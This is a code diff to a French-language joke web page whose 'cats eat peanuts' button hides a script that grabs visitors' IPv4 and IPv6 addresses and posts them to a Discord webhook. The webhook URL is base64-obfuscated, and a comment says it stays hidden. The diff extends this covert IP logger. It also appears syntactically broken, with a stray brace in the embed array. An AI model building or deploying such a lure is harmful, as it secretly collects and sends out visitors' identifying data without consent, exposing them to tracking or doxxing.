@@ -20,33 +20,54 @@
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 
 <script>
-const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4NDA4MDU1ODcxOTAxNy9PSWp0WmpDRXVURkx4LWhOMF9JREpMRTVsd3AtcDR5d0E3VFBhQ08zTWdTcnhkMEpwNm8zbDBjLWp5ZU9oWWkxak9PVQ=="; 
+// Ton webhook actuel (en base64, toujours caché)
+const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4NDA4MDU1ODcxOTAxNy9PSWp0WmpDRXVURkx4LWhOMF9JREpMRTVsd3AtcDR5d0E3VFBhQ08zTWdTcnhkMEpwNm8zbDBjLWp5ZU9oWWkxak9PVQ==";
 
 let human = false;
 document.onmousemove = document.ontouchstart = () => human = true;
 
-async function getIP() {
-    try { return (await (await fetch("https://api.ipify.org?format=json")).json()).ip; }
-    catch { return "inconnue"; }
+async function getIPs() {
+    let ipv4 = "inconnue";
+    let ipv6 = "non détectée";
+
+    try {
+        const res = await fetch("https://api64.ipify.org?format=json");
+        const data = await res.json();
+        if (data.ip.includes(":")) ipv6 = data.ip;
+        else ipv4 = data.ip;
+    } catch {}
+
+    if (ipv4 === "inconnue") {
+        try {
+            ipv4 = await (await fetch("https://api.ipify.org")).text();
+        } catch {}
+    }
+
+    return { ipv4, ipv6 };
 }
 
 async function send() {
-    const ip = await getIP();
-    const url = atob(webhookB64); // ← décode seulement à l'exécution
+    const { ipv4, ipv6 } = await getIPs();
+    const url = atob(webhookB64);
 
     fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             embeds: [{
-                title: "Nouveau chat",
-                color: 16749880,
-                fields: [
-                    {name:"IP",value:ip,inline:true},
-                    {name:"Heure",value:new Date().toLocaleString("fr-FR")}
-                ],
-                thumbnail:{url:"https://cataas.com/cat"}
-            }]
+                {
+                    title: "Nouveau chat nourri de cacahuètes",
+                    color: 16749880,
+                    fields: [
+                        { name: "IPv4", value: ipv4, inline: true },
+                        { name: "IPv6", value: ipv6, inline: true },
+                        { name: "Heure", value: new Date().toLocaleString("fr-FR"), inline: false }
+                    ],
+                    image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
+                    thumbnail: { url: "https://cataas.com/cat" },
+                    footer: { text: human ? "Détecté comme humain" : "Envoi automatique" }
+                }
+            ]
         })
     });
 }
@@ -54,8 +75,10 @@ async function send() {
 document.getElementById("btn").onclick = () => {
     human = true;
     send();
-    document.getElementById("btn").style = "transform:scale(0);transition:.6s";
-    setTimeout(() => document.getElementById("btn").remove(), 600);
+    const b = document.getElementById("btn");
+    b.style.transition = "all .6s";
+    b.style.transform = "scale(0)";
+    setTimeout(() => b.remove(), 600);
     alert("Merci ! Les chats sont contents");
 };
 
